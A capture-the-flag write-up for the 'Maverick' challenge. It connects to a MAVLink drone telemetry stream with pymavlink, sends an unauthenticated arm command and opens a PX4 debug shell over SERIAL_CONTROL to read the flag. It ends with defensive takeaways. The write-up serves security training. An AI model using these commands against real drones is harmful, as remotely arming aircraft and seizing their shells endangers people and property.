# Maverick

Author - Senpai
Flag: SK-CERT{d3bu6_my_fly1ng_m4ch1n3}
Maverick — Detailed Writeup

Points: 495 | Category: MAVLink / Drone / Protocol Exploitation
Challenge

    Can you hack Maverick as he flies by? nc exp.cybergame.sk 7030

Step 1 — Identifying the Protocol

Connecting with nc produced a stream of binary data. The first byte of every frame was 0xFE — the MAVLink v1 magic byte. The challenge name "Maverick" is a direct reference to MAVLink (Micro Air Vehicle Link), the telemetry protocol used by drones running ArduPilot and PX4.

Confirming with pymavlink:
python

master = mavutil.mavlink_connection('tcp:exp.cybergame.sk:7030')
master.wait_heartbeat()
# HEARTBEAT from System 1 (Component 0)

The stream contained standard drone telemetry: HEARTBEAT, GLOBAL_POSITION_INT, ATTITUDE, SERVO_OUTPUT_RAW, VFR_HUD, HIGHRES_IMU, and STATUSTEXT. The STATUSTEXT messages read:

Preflight: debug serial bridge disabled until vehi[cle is armed]

This was the critical hint — a debug serial shell was available but locked behind an arming condition.
Step 2 — Arming the Vehicle

In ArduPilot/PX4, MAV_CMD_COMPONENT_ARM_DISARM arms the vehicle. Sending this command with param1=1 (ARM) triggered the unlock:
python

master.mav.command_long_send(
    master.target_system, master.target_component,
    mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM,
    0, 1, 0, 0, 0, 0, 0, 0
)

The STATUSTEXT messages immediately changed:

Vehicle armed; debug serial bridge is now availabl[e]
AUTO mission active; debug serial bridge enabled

Step 3 — Accessing the Debug Shell

MAVLink's SERIAL_CONTROL message provides a tunneled serial interface. PX4 exposes an interactive debug shell over this channel using device ID 10 (SHELL).

Sending a newline to the shell returned:

PX4 debug shell over MAVLink SERIAL_CONTROL
Type 'help' for commands.
dvd-shell$

Running ls revealed the filesystem:

flag.txt
etc
home
proc

Step 4 — Reading the Flag
python

master.mav.serial_control_send(
    10,  # SHELL device
    SERIAL_CONTROL_FLAG_REPLY | SERIAL_CONTROL_FLAG_EXCLUSIVE,
    0, 57600, len(cmd), list(cmd_data)
)

With command cat /flag:

SK-CERT{d3bu6_my_fly1ng_m4ch1n3}
dvd-shell$

Flag

SK-CERT{d3bu6_my_fly1ng_m4ch1n3}

Attack Chain Summary

Connect to MAVLink stream
        ↓
Observe STATUSTEXT: "debug bridge disabled until vehicle armed"
        ↓
Send MAV_CMD_COMPONENT_ARM_DISARM (param1=1)
        ↓
Serial bridge unlocks
        ↓
Send SERIAL_CONTROL to device=SHELL
        ↓
Interactive PX4 shell → cat /flag
        ↓
Flag

Key Takeaways

    MAVLink has no authentication by default. Any client that can reach the UDP/TCP port can send arbitrary commands including arming, mode changes, and waypoint uploads.
    Debug interfaces should never be reachable on production systems. The serial bridge was one ARM command away from being open to anyone.
    SERIAL_CONTROL is a powerful attack vector — it provides full shell access once armed, equivalent to physical UART access to the flight controller.
    The challenge name "Maverick" was a double hint: Top Gun's callsign (flies by) and MAVLink (the protocol).
